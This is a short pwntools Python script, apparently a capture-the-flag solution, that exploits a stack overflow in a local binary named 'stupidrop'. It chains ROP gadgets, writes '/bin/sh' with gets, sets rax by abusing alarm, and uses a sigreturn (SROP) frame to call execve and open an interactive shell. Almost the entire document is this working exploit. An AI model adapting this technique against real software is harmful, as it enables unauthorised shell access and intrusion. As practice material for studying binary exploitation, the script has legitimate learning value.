from pwn import *

# Establish the target
target = process('./stupidrop')


elf = ELF('stupidrop')

context.arch = "amd64"

# Establish needed gadgets
syscall = p64(0x40063e)
popRdi = p64(0x4006a3)

# Establish needed functions
gets = p64(elf.symbols['gets'])
alarm = p64(elf.symbols['alarm'])

# Establish address where we will write "/bin/sh"
binshAdr = p64(0x601050)

# Filler to return address
payload = ""
payload += "0"*0x38

# Use gets to write "/bin/sh" to 0x601050
payload += popRdi
payload += binshAdr
payload += gets


# Use alarm to set the rax register to 0xf
payload += popRdi
payload += p64(0xf)
payload += alarm
payload += popRdi
payload += p64(0x0)
payload += alarm

# Execute the SROP to make the execve call
frame = SigreturnFrame()

# Specify rip to point to the syscall instruction
frame.rip = 0x40063e

# Prep the registers for the execve syscall
frame.rax = 0x3b
frame.rdi = 0x601050
frame.rsi = 0x0
frame.rdx = 0x0

# Add the sigreturn frame to the payload, and make the syscall
payload += syscall
payload += str(frame)


# Send the payload
target.sendline(payload)

# Send "/bin/sh" to the gets call
raw_input()
target.sendline("/bin/sh\x00")


target.interactive()
